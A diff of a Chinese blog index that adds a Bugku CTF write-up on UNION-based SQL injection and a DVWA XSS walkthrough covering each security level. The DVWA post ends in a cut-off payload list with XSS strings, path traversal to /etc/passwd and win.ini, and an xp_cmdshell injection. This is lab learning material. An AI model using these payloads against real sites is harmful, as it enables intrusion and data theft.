@@ -65,11 +65,11 @@
 		<nav class="header-smart-menu">
     		
     			
-    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章（点击这个可以筛选标签）</a>
+    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">文章目录</a>
     			
             
     			
-    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">传送门</a>
+    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
     			
             
     			
@@ -147,6 +147,918 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-bk20-成绩单" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/08/bk20-成绩单/">Bugku 2019/10/8 成绩单</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/08/bk20-成绩单/" class="archive-article-date">
+  	<time datetime="2019-10-07T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>显然是sql注入</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li><p>输入1’，输出不正常，1’#,输出正常。应该是字符型输出。</p>
+</li>
+<li><p>输入1’ or 1# 只输出一个，可见输出受限。</p>
+</li>
+<li><p>输入一个没有数据的id，在用union select暴库。</p>
+</li>
+<li><p>输入4’ union select 1,2,3,4#<br>（1、2、3、4是一个个试过来的，得到字段数，用order by 报错被抑制）</p>
+</li>
+<li><p>输入4’ union select database(),2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>得到数据库中的表。</p>
+</li>
+<li><p>输入4’ union select database(),2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</p>
+</li>
+<li><p>输入4’ union select database(),2,3,group_concat(skctf_flag) from skctf_flag.fl4g#<br>得到flag。</p>
+</li>
+</ol>
+<p>附：暴库 4’ union select database(),2,3,group_concat(schema_name) from information_schema.schemata#</p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
+<li><strong>SQL注入</strong></li>
+<li><strong>group_concat</strong></li>
+<li><strong>暴库、暴表、暴字段</strong></li>
+<li><strong>information_schema.schemata</strong></li>
+<li><strong>information_schema.tables where table_schema=’’</strong></li>
+<li><strong>information_schema.columns where table_name=’’</strong></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/08/bk20-成绩单/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-DVWAXSS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/07/DVWAXSS/">DVWA-XSS全解</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/07/DVWAXSS/" class="archive-article-date">
+  	<time datetime="2019-10-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><p>DOM Based XSS：是基于DOM文档对象模型的操作，通过前端脚本修改页面的DOM节点形成的XSS，该操作不与服务器端进行交互，而且代码是可见的，从前端获取到DOM中的数据在本地执行，从效果上来说也是反射型XSS。<br>说白了就是在HTML里攻击。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>选择一个语言提交后，url里会出现以get方式提交的default，<br>令default=&lt;script&gt;alert(“xss”)&lt;/script&gt;<br>攻击成功。</p>
+<p>html里的这块代码和High级是一样的，目的是美化选项下拉框。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">					if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span><br><span class="line">						var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line">					document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">				&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>php代码里屏蔽了script（不分大小写）。<br>利用img标签。<br>闭合&lt;option&gt;和&lt;select&gt;标签，是代码在value里也可以运行。<br>令default=&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(“xss”)&gt;<br>攻击成功。</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>html源码里有一段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">					if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;  //document.location.href是url地址，判断是否存在这个语句。</span><br><span class="line">						var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);//利用substring方法从defaut=后开始读取lang</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);//decodeURI解码统一资源标记符</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);//画一个选不了的---</span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line">					document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">				&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其实不是很重要。</p>
+<p>这里对default的限制是在服务器的php脚本中检查的，所以只要用#不把内容传给服务器就可以了。<br>令default=English#&lt;script&gt;alert(“xss”)&lt;/script&gt;<br>或default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(“xss”)&gt;<br>攻击成功。</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">					if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span><br><span class="line">						var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + (lang) + &quot;&lt;/option&gt;&quot;);//不解码了，正常的选项不需要解码</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line">					document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">				&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Reflected"><a href="#Reflected" class="headerlink" title="Reflected"></a>Reflected</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><p>输入&lt;script&gt;alert(“xss”)&lt;/script&gt;<br>攻击成功。<br>这是依靠php来写html元素。</p>
+<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>把小写的script替换为””了。<br>输入&lt;Script&gt;alert(“xss”)&lt;/sCript&gt;<br>html标签无视大小写。<br>攻击成功。</p>
+<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><p>它用正则表达式处理script标签，<br>那我们就不管它了，通过img标签攻击。<br>输入&lt;img src=1 onerror=alert(“xss”)&gt;<br>攻击成功。前两题也可以用这个。</p>
+<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>看一下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Feedback for end user </span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken();</span><br></pre></td></tr></table></figure>
+
+<p>主要是用了htmlspecialchars函数，<br>效果是：<br><img src="/img/xss-1.png" alt="xss-1"><br>相当于把输入变成了&amp;ltimg src=1 onerror=alert(“xss”)&amp;gt,变成了纯粹的文本。</p>
+<h1 id="Stored"><a href="#Stored" class="headerlink" title="Stored"></a>Stored</h1><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><p>也是通过php来写html元素。<br>源码是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); //trim也可以用来获取输入</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Sanitize message input 去除输入框内容</span><br><span class="line">    $message = stripslashes( $message );  //删除斜杠</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); </span><br><span class="line"></span><br><span class="line">    // Sanitize name input 去除输入框内容</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); </span><br><span class="line"></span><br><span class="line">    // Update database </span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; //这个是更新数据库</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>随便输个名字<br>message里填&lt;script&gt;alert(“xss”)&lt;/script&gt;<br>之所以可以攻击是因为斜杠被URI编码，这里的过滤无效。<br><img src="/img/xss-2.png" alt="xss-2"><br><img src="/img/xss-3.png" alt="xss-3"><br>无论是name还是message都很好攻击。<br>攻击成功。</p>
+<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); </span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Sanitize message input </span><br><span class="line">    $message = strip_tags( addslashes( $message ) ); </span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); </span><br><span class="line">    $message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">    // Sanitize name input </span><br><span class="line">    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); </span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); </span><br><span class="line"></span><br><span class="line">    // Update database </span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; </span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可见name字段比较薄弱，用bp绕过前端限制攻击。<br>攻击成功。</p>
+<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>message那一块儿没有变动，<br>name那一块儿针对script做了限制。改用img。<br><img src="/img/xss-4.png" alt="xss-4"><br>攻击成功。</p>
+<h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; );</span><br><span class="line">    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>加了Anti-CSRF token、改动了更新数据库的部分，这些不太懂。<br>主要是name和message的安全等级一样了，这和反射型xss攻击的impossible原理是近乎一致的。</p>
+<hr>
+<p>测试代码大全</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line">%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E</span><br><span class="line">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp</span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line">%3f.jsp</span><br><span class="line">%3f.jsp</span><br><span class="line">&lt;script&gt;alert(&apos;Vulnerable&apos;);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">?sql_debug=1</span><br><span class="line">a%5c.aspx</span><br><span class="line">a.jsp/&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">a/</span><br><span class="line">a?&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">&apos;;exec%20master..xp_cmdshell%20&apos;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&apos;--&amp;&amp;</span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span 